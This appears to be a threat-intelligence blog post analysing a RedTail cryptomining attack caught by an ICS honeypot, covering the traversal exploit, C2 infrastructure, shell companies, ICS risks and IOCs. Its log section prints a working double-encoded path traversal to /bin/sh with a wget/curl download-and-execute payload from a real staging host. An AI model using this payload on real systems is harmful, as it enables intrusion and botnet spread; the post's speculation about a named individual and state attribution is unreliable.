---
title: "RedTail 2026 Cryptomining Botnet Campaign"
date: 2026-02-02
draft: false
description: "North Korean threat actor at it again"
tags: ["crypto", "mining", "botnet", "malware"]
categories: ["general"]
toc: false
---

## Background

I set my ICS/SCADA honeypot (Conpot) up mainly to try and analyze/monitor attacks on industrial systems (this one poses as a PLC for an HVAC system), however the majority of the attempts I've noticed have been opportunistic web-based attacks targeting the associated page on port 80.

Recently, I've noticed some similar looking attacks coming from Asia, both trying to connect to a C2 server hosted in the United States, and registered by an Estonian company... Very suspicious.

## Log Analysis

Here is an example of one of the logs I captured:

```bash
2026-02-01 05:50:39,903 HTTP/1.1 POST request from ('101.36.123.102', 46080): 
Path: '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
Headers: [
    ('Host', '134.209.179.94:80'), 
    ('User-Agent', 'libredtail-http'), 
    ('Content-Type', 'text/plain'), 
    ('Content-Length', '119')
]
Payload: (wget --no-check-certificate -qO- https://178.16.55.224/sh || curl -sk https://178.16.55.224/sh) | sh -s apache.selfrep
```

`101.36.123.102` is most likely a compromised system whose owner has zero idea their device is being used as part of a botnet. This is less interesting.

A couple of things did stand out to me, most notably the very suspicious looking User-Agent, `libredtail-http`. This user agent is associated with a known cryptomining malware: RedTail, whose staging server is the same one I noticed: `178[.]16[.]55[.]224`.

Otherwise, the use of `%%32$65` is also an immediate red flag. `%32%65` decodes to 2e, which is the hex for a dot `.`. This is a clever way to bypass filters that might be looking for `%2e` specifically by encoding the percent sign itself or hoping the parser "double-dips" the decoding.

`/cgi-bin/../../../../../../bin/sh` is the decoded path. A classic directory traversal attack, using multiple `../` to traverse up the directory tree, in an attempt to reach `/bin/sh` the system shell, so that it can execute arbitrary shell commands (fetching the malicious script from the staging server). The threat actor is also using the || (OR) command to ensure that if `wget` is not present on the target system, the command falls back to using `curl` instead to fetch the malicious script.

You can also see that at the end, the command indicates that the script is intended to immediately begin scanning for other vulnerable Apache servers to continue infecting. This is the telltale sign of an attempt to add a vulnerable server to a botnet. In this case, the attackers are trying to recruit vulnerable web servers into mining crypto on their behalf.

## C2 Investigation

The attack made almost zero effort to obfuscate its intent, so I spent a lot more time investigating the staging server and who these cyber criminals may be.

The identity of the legal owner comes back to Railnet LLC, registered in Kentucky. However, the actual technical operator is an Estonian shell company named [API-VERSA](https://ariregister.rik.ee/eng/company/16832576/API-VERSA-O%C3%9C#:~:text=VERSA%20O%C3%9C%20(16832576)-,API%20VERSA%20O%C3%9C%20(16832576),Verification%20from%20Official%20Announcements%20failed.). I don't think there's much argument over that, considering the company has one representative, who is also the singular shareholder, with no employees. They were registered in 2023, but haven't submitted their annual reports for 2024 or 2025 (likely on purpose). The company is registered at a well-known virtual office address in Tallinn. Also the sole property of the company is listed as €1.

My logical assumption is that this was a shell company spun up 3 years ago as a legal barrier/shield for their operations. Estonia is a well established and globally recognized democratic nation, and registering your company there gives you a sense of legitimacy that you don't get with the countries that cyber-criminals are often from (like Russia, North Korea, etc.) An Estonian shell company can easily obtain trusted SSL/TLS certificates, which are then used by RedTail to encrypt its C2 traffic... Quite a smart move.

Estonia is unique in that it allows non-residents to open companies and then manage them remotely from anywhere in the world. They call it e-Residency. This easily enables threat actors, likely from Eastern Europe (proximity), to maintain a company there without ever having set foot in the EU. An Estonian private limited company can quite literally be established within minutes for a very low cost. It's practically disposable, and it takes no effort for the threat actor to spin up a new shell company.

The paper trail also leads to a man named Jacob Andrew Kristuli, supposedly a 31-year-old American living in Estonia (with a -440 credit score) with a €1 company and an Albanian phone number (interesting). 'Jacob' is more likely a synthetic identity used to sign the leases on the servers that power the RedTail botnet. By the time law enforcement knocks on the door of his virtual office in Tallinn, the attackers will have already moved on to their next identity, leaving 'Jacob' and his €1 shell company to be deleted by the registry.

It's most likely that Jacob Andrew Kristuli is a money mule who doesn't realize his name is being used by a criminal organization to run a global crypto mining botnet scheme. Or he could be a fake person. I always debate reaching out to people like that, because there's a chance that he is directly involved.

Anyways, in layering their infrastructure across multiple countries, these RedTail actors are making it difficult for law enforcement. The actual physical C2 infrastructure is hosted in Germany through Aurologic, while the ASN and legal ownership trace back to the US through Railnet LLC. Here's how the layers break down:

| Moat Component | Location | Role in Attack | Legal Shielding Benefit |
|----------------|----------|----------------|------------------------|
| Corporate Front | 🇪🇪 Estonia | Identity: API-VERSA OÜ | Remote management; difficult to serve physical warrants to a "virtual office." |
| IP Reputation | 🇺🇸 USA | Registration: Railnet LLC | Bypasses "high-risk country" IP filters; looks like a standard US business. |
| Operational Hub | 🇩🇪 Germany | Hosting: Aurologic | High-speed infrastructure protected by strict EU data privacy laws. |
| The "Ghost" | 🇦🇱 Albania | Communication: (+355) Phone | A "burner" contact number used for registration that leads to a dead end. |

If the threat actors were working directly out of their home countries, modern firewalls, EDRs, and ISP rules would most likely immediately block their traffic. Traffic coming from places like Pyongyang, Moscow, Beijing are easily identifiable (e.g. 175.45.176.0/22 is the North Korean IP space). So using Estonia as their administrative shell allows the threat actors to host their physical infrastructure in Germany with American IP reputation via Railnet LLC. This combination of German-hosted servers, American IP space, and an Estonian-backed shell company creates significant friction for takedown efforts. EU data privacy regulations protect the German hosting, while the multi-jurisdictional nature requires coordination between US, Estonian, and German authorities.

The threat actors can also wash their funds via fintech accounts like Revolut (these services will obviously not accept sanctioned entities, therefore the Jacob Andrew Kristuli identity). They can pay for their hosting and bandwidth using "clean" Euro or USD accounts, making the infrastructure self-sustaining and disconnected from the regime's sanctioned wallets.

The only solution to something like that is to make it more difficult to register shell companies in Estonia... Which I don't see happening.

## PLC Implications

In a normal IT environment, a cryptominer is annoying. It slows down your browser, makes your laptop fan spin up, maybe crashes Excel. In an industrial control system, it can be catastrophic. PLCs operate on what's called a "scan cycle", which is a loop where the controller reads inputs from sensors, executes its logic, and writes outputs to the actuators. This cycle has to complete within a deterministic timeframe, often measured in *milliseconds*.

RedTail is designed to consume as much CPU as possible to maximize mining profits. If the mining process causes the PLC's CPU to spike, the scan cycle lags or fails entirely. That means a valve might stay open too long, a motor might not stop when it should, or a safety shutdown could be delayed. In a building automation system, that could mean HVAC systems running out of control or fire suppression systems failing to activate... Not good.

The collateral damage doesn't stop at CPU exhaustion. The malware I captured included a self-replication script (`apache.selfrep`) that likely contains "cleanup" logic to kill competing processes and free up resources for mining. On a PLC or an HMI (Human Machine Interface), these scripts could inadvertently kill legitimate control processes/monitoring services. The operator might see a frozen screen showing everything is normal while the actual process is failing in the background, what we would call a "silent" failure.

Then there's also the network impact. The command in my logs shows the malware using `wget` to reach out to the C2 server. Cryptominers constantly communicate with mining pools, and this background traffic can saturate the narrow bandwidth of industrial networks like Modbus/TCP or EtherNet/IP. In ICS environments, timing is everything... High network jitter causes timeout errors between the PLC and its I/O devices, potentially triggering an emergency stop and halting production entirely. Depending on the industry, that could be a disaster.

## The Lazarus Connection

There's significant evidence from researchers that RedTail isn't just some random operation running out of a basement. The level of investment in the infrastructure I uncovered: the Estonian shell companies, German hosting, American IP reputation, Albanian burner numbers, private mining pools, and multi-architecture binaries, points toward a nation-state-sponsored actor. Most likely North Korea's Lazarus Group.

The [Global Cyber Alliance's AIDE database](https://globalcyberalliance.org/aide-data-redtail/) links RedTail to a broader campaign of North Korean cyber operations. Unlike Russian groups that favor ransomware for quick payouts, North Korean groups use cryptomining as a steady, long-term revenue stream to bypass international sanctions. 

My HVAC honeypot isn't the primary target. It's just a "battery" they want to drain for cash. The beauty of cryptomining from their perspective is that it's low-risk and high-volume. Infect thousands of systems globally, run them at high CPU utilization, and let the cryptocurrency trickle in! No ransom negotiations, no data exfiltration, no triggering immediate incident response. They just quietly siphon computational resources to fund the operations of their ill regime.

The multi-jurisdictional infrastructure I traced (Estonia, Germany, USA, Albania) makes perfect sense in this context. North Korea is one of the most heavily sanctioned nations on earth. Direct financial transactions are impossible. So they layer their operations through legitimate-looking Western infrastructure, wash their funds through fintech services using synthetic identities like "Jacob Andrew Kristuli," and convert computational power into cryptocurrency that can't be seized or frozen by traditional banking systems.

It's quite elegant.

## RedTail Evolving (Moving beyond web-apps)

RedTail isn't standing idle. Recent reports from [IBM](https://exchange.xforce.ibmcloud.com/osint/guid:00fd357f10c6450e9038b438b836a9c1) and [Offsec](https://radar.offseq.com/threat/first-public-evidence-redtail-cryptominer-targets--1a0dfaae) show the campaign has evolved significantly in late 2025 and early this year. The threat actors have moved beyond traditional web application exploits and are now actively targeting exposed Docker APIs and unprotected AI infrastructure, like public-facing LLM endpoints that companies are spinning up without proper authentication.

The technical sophistication has also increased. Newer variants of the RedTail binary now include "self-debugging" features. If the malware detects it's being run in a sandbox environment or attached to a debugger, it will immediately terminate or change its behavior to mimic a harmless system utility. This is classic anti-analysis tradecraft you'd expect from a well-resourced threat actor, not some opportunistic botnet operator.

According to Offseq, the Docker-targeting variants specifically look for misconfigured container environments where the Docker daemon socket (`/var/run/docker.sock`) is exposed without authentication. Once they gain access, they spin up privileged containers with the host's filesystem mounted, giving them root-level access to the underlying system. From there, they deploy the mining payload and use the container orchestration to ensure persistence even if individual containers are killed (`--restart=always`, etc.).

The AI infrastructure targeting is particularly concerning for organizations rushing to deploy LLM services. Many companies are exposing inference endpoints to the internet without rate limiting or authentication, creating perfect targets for RedTail to resource hijack. RedTail variants have been observed scanning for common AI framework ports (like TensorFlow Serving on 8501 or Ollama on 11434) and exploiting them to run mining operations disguised as legitimate model inference requests. Innovation in the crypto mining malware space, who would've seen it coming?

## Worm-Like Self-Replication

In the log, you can see at the end - `sh -s apache.selfrep`. This isn't just installing a miner and calling it a day. The `apache.selfrep` parameter tells the downloaded script to enable self-replication mode, which turns your compromised server into an active attacker.

Once infected, your system immediately begins scanning the internet for other vulnerable Apache servers using the same `%%32%65` directory traversal exploit. It's worm-like behavior: each infected host becomes a new vector for spreading the infection. This is why I captured attacks from `101.36.123.102` and `139.99.124.59` (China, Singapore), which are almost certainly compromised systems whose owners have no idea their servers are now part of a North Korean cryptomining botnet actively attacking other targets.

The self-replication works in a feedback loop: the more systems RedTail compromises, the faster it spreads, because every new victim becomes another scanner looking for the next vulnerable target. It's exponential growth. One infected web server can scan thousands of IP addresses per hour looking for exposed `/cgi-bin/` endpoints. When it finds one, it delivers the same payload, which then starts scanning, and so on and so on and so on....

For an organization, the reputational damage from this is often worse than the CPU theft itself. Your corporate IP address will end up on global blocklists like Spamhaus, AbuseIPDB, and various threat intelligence feeds. Once you're listed as a source of malicious scanning activity, the consequences pile up quick: your legitimate emails start going to spam, your web traffic gets blocked by security-conscious partners, and cloud providers like AWS or Azure may suspend your account for violating their abuse policies. Some companies spend months trying to get delisted, having to prove to every individual blocklist operator that they've cleaned their systems and implemented proper security controls.

The irony is that your server becomes both victim and perpetrator simultaneously... mining cryptocurrency for North Korea while also doing their dirty work of finding new targets to infect.

## Key Takeaways

**Indicators of Compromise (IOCs):**

- C2 Server: `178.16.55.224` (hosted in Germany via Aurologic)
- User-Agent: `libredtail-http`
- Binary: `.redtail` (hidden file)
- Encoded Path: `%%32%65` (double-encoded dots for directory traversal)
- Script Parameter: `apache.selfrep` (enables worm-like spreading)

**The Infrastructure Strategy:**
RedTail leverages Estonian e-Residency to create disposable shell companies (like API-VERSA OÜ) that provide legal cover and enable trusted SSL/TLS certificates. Combined with US-based ASN registration through Railnet LLC and German physical hosting, this multi-jurisdictional setup bypasses geo-fencing rules that would normally block traffic from high-risk nations. This creates significant friction for law enforcement takedowns, requiring coordination across multiple countries with different data privacy regulations. In practice, this is almost impossible hence the name "bulletproof hosting".

**The Risk:**
This isn't just a cryptominer slowing down web servers. RedTail is a performance-degrading, self-replicating worm with credible links to North Korean state actors (likely Lazarus Group).

For ICS/SCADA environments, CPU exhaustion can disrupt PLC scan cycles and cause physical safety hazards. For any organization, the self-replication behavior turns your infrastructure into an attack platform, landing you on global blocklists and causing reputational damage that can take months to repair. The campaign is actively evolving, now targeting Docker APIs and AI infrastructure with anti-analysis features designed to evade security research.

If you see traffic patterns matching these IOCs, assume you're dealing with a well-resourced nation-state operation, not some opportunistic criminal. Respond accordingly.

---

## Sources & Further Reading

**Threat Intelligence & Research:**

- [Global Cyber Alliance - AIDE RedTail Data](https://globalcyberalliance.org/aide-data-redtail/)
- [IBM](https://exchange.xforce.ibmcloud.com/osint/guid:00fd357f10c6450e9038b438b836a9c1)
- [Offseq](https://radar.offseq.com/threat/first-public-evidence-redtail-cryptominer-targets--1a0dfaae)

**Infrastructure Investigation:**

- [Estonian Business Registry - API-VERSA OÜ](https://ariregister.rik.ee/eng/company/16832576/API-VERSA-O%C3%9C)

**Attribution & Context:**

- WHOIS data for AS398465 (Railnet LLC)
- Aurologic hosting infrastructure analysis
- North Korean IP space: 175.45.176.0/22

**Industrial Control Systems Security:**

- Modbus/TCP Protocol Specifications
- S7Comm Protocol Documentation (Siemens)
- ICS-CERT Advisories on OT/IT Convergence Risks
